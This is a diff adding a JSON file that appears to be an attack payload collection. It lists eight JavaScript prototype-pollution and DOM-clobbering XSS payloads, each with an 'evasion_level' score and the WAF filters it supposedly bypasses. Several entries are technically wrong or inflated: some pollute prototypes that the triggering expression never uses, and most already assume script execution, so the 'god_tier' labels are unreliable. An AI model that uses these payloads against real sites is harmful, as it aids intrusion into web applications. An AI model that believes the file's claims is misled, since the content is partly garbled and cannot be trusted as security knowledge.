@@ -1,0 +1,145 @@
+{
+  "category": "javascript_proto_pollution_xss",
+  "description": "Prototype pollution leading to DOM clobbering and XSS",
+  "difficulty": "god_tier_advanced",
+  "payloads": [
+    {
+      "name": "proto_onerror_pollution",
+      "payload": "__proto__.onerror = alert; throw 1;",
+      "description": "Prototype pollution of onerror handler",
+      "context": [
+        "__proto__",
+        "onerror",
+        "prototype_pollution",
+        "error_handling"
+      ],
+      "encoding": "none",
+      "evasion_level": 10,
+      "waf_bypass": [
+        "proto_detection",
+        "onerror_filters",
+        "pollution_detection"
+      ]
+    },
+    {
+      "name": "constructor_prototype_pollution",
+      "payload": "constructor.prototype.toString = function(){return 'alert(1)'}; eval({}+'');",
+      "description": "Constructor prototype pollution with eval",
+      "context": [
+        "constructor",
+        "prototype",
+        "toString",
+        "eval"
+      ],
+      "encoding": "none",
+      "evasion_level": 10,
+      "waf_bypass": [
+        "constructor_detection",
+        "prototype_filters",
+        "eval_detection"
+      ]
+    },
+    {
+      "name": "object_prototype_valueof",
+      "payload": "Object.prototype.valueOf = function(){return 'alert(1)'}; +{};",
+      "description": "Object prototype valueOf pollution",
+      "context": [
+        "Object_prototype",
+        "valueOf",
+        "type_coercion",
+        "pollution"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "valueOf_detection",
+        "object_prototype_filters"
+      ]
+    },
+    {
+      "name": "dom_clobbering_pollution",
+      "payload": "<form id=__proto__><input name=onerror value=alert(1)>",
+      "description": "DOM clobbering via form proto pollution",
+      "context": [
+        "dom_clobbering",
+        "__proto__",
+        "form",
+        "input_pollution"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "dom_clobbering_filters",
+        "form_pollution_detection"
+      ]
+    },
+    {
+      "name": "array_prototype_pollution",
+      "payload": "Array.prototype.join = function(){return 'alert(1)'}; [].join();",
+      "description": "Array prototype join method pollution",
+      "context": [
+        "Array_prototype",
+        "join",
+        "method_pollution",
+        "array_methods"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "array_pollution_detection",
+        "join_method_filters"
+      ]
+    },
+    {
+      "name": "function_prototype_call_pollution",
+      "payload": "Function.prototype.call = function(){alert(1)}; setTimeout('',0);",
+      "description": "Function prototype call pollution with setTimeout",
+      "context": [
+        "Function_prototype",
+        "call",
+        "setTimeout",
+        "function_pollution"
+      ],
+      "encoding": "none",
+      "evasion_level": 10,
+      "waf_bypass": [
+        "function_prototype_filters",
+        "call_pollution_detection"
+      ]
+    },
+    {
+      "name": "string_prototype_pollution",
+      "payload": "String.prototype.toString = function(){return 'alert(1)'}; eval(''+{});",
+      "description": "String prototype toString pollution",
+      "context": [
+        "String_prototype",
+        "toString",
+        "string_pollution",
+        "eval"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "string_prototype_filters",
+        "toString_pollution_detection"
+      ]
+    },
+    {
+      "name": "global_pollution_window",
+      "payload": "window.__proto__.alert = function(x){eval(x)}; alert('1');",
+      "description": "Global window prototype pollution",
+      "context": [
+        "window",
+        "__proto__",
+        "global_pollution",
+        "function_override"
+      ],
+      "encoding": "none",
+      "evasion_level": 10,
+      "waf_bypass": [
+        "window_pollution_detection",
+        "global_proto_filters"
+      ]
+    }
+  ]
+}
